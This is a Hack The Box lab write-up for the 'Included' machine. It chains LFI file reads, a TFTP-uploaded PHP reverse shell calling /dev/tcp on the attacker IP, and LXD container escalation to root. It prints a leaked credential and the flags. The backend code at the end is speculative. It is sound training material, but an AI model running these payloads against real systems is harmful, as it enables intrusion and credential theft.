---
title: HTB: Included – Full Write-Up
description: A step-by-step walkthrough of the Hack The Box "Included" machine, demonstrating LFI, TFTP shell upload, and LXD privilege escalation.
tags:
  - HackTheBox
  - LFI
  - TFTP
  - ReverseShell
  - LXD
  - PrivilegeEscalation
  - CTF
  - Linux
  - Pentesting
  - Cybersecurity
---

# HTB: Included – Full Write-Up

**Target IP:** 10.129.95.185  
**Attacker IP:** 10.10.14.5

---

## 🧠 Summary

This box required chaining multiple vulnerabilities:

- **Local File Inclusion (LFI)** to access sensitive server-side files.
- **TFTP** to upload a custom reverse shell.
- **LXD privilege escalation** via a custom Alpine container.

The flow: LFI → leaked credentials → TFTP reverse shell → user access → LXD escalation → root.

---

## 🔍 Enumeration

Initial scan:

```bash
nmap -sC -sV 10.129.95.185
```

Results:
- Port 80 open (Apache httpd 2.4.29)
- Title: “Site doesn't have a title”
- Web parameter observed: `?file=home.php`

---

## 📂 LFI Exploitation

Tested traversal:

```http
http://10.129.95.185/?file=../../../../etc/passwd
```

Confirmed LFI — `/etc/passwd` dumped successfully.

Tried to access `/etc/shadow` but returned a blank page → expected due to web server permissions.

### Base64 LFI:

```http
?file=php://filter/convert.base64-encode/resource=home.php
```

Successfully retrieved base64 source of `home.php` → decoded to static HTML.

Tested `.htaccess` as well:

```http
?file=php://filter/convert.base64-encode/resource=.htaccess
```

Revealed Apache rewrite rules and commented-out HTTP Basic Auth:
```
AuthUserFile /var/www/html/.htpasswd
```

Retrieved `.htpasswd`:

```http
?file=/var/www/html/.htpasswd
```

✅ Credentials found:
```
mike:Sheffield19
```

---

## 🌐 No Login Panel Found

Tested:
- `/login.php`
- `/admin.php`
- `/panel/`
- `/dashboard.php`

None responded with usable login.

---

## 🌐 UDP Enumeration

Initial UDP scan:

```bash
sudo nmap -sU 10.129.95.185
```

Too slow — optimized:

```bash
sudo nmap -sU -p 69 --min-rate=1000 -T4 10.129.95.185
```

Port 69/UDP (TFTP) confirmed open.

---

## 💣 Reverse Shell via TFTP

Created `shell.php` reverse shell script:

```php
<?php
$ip = '10.10.14.5';
$port = 4444;
exec("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
?>
```

Uploaded via TFTP:

```bash
tftp 10.129.95.185
put shell.php
```

Triggered:

```bash
curl 'http://10.129.95.185/?file=/var/lib/tftpboot/shell.php'
```

Got reverse shell as `www-data`.

Upgraded shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 👤 Lateral Movement to User `mike`

Used leaked password `Sheffield19` for local login:

```bash
su mike
```

Found `user.txt`:

```bash
cat /home/mike/user.txt
# a56ef91d70cfbf2cdb8f454c006935a1
```

---

## 🧱 Privilege Escalation via LXD

Check groups:

```bash
id
# mike is in group: lxd
```

Built Alpine container on attacker machine:

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
python3 -m http.server 8000
```

On target:

```bash
wget http://10.10.14.5:8000/alpine.tar.gz
lxc image import ./alpine.tar.gz --alias pwnimage
lxc init pwnimage pwncontainer -c security.privileged=true
lxc config device add pwncontainer host-root disk source=/ path=/mnt/root recursive=true
lxc start pwncontainer
lxc exec pwncontainer /bin/sh
chroot /mnt/root /bin/bash
```

🎉 Now root on host.

---

## 🏁 Got Root

```bash
cd /root
cat root.txt
# c693d9c7499d9f572ee375d4c14c7bcf
```

---

## 🧠 Notes on LFI Fallback Logic

Backend PHP might look like:

```php
$file = $_GET['file'];
$whitelist = ['home.php', 'about.php'];

if (in_array($file, $whitelist)) {
    include($file);
} else {
    include('home.php');
}
```

Or:

```php
$file = basename($_GET['file']);
include($file);
```

---

## 🎯 Lessons Learned

- LFI is still powerful when combined with `php://filter`.
- TFTP can be a viable upload path even when underused.
- LXD group membership is a goldmine if misconfigured.

---

*Rooted with persistence, misconfig chaining, and container escape tactics. 💥*
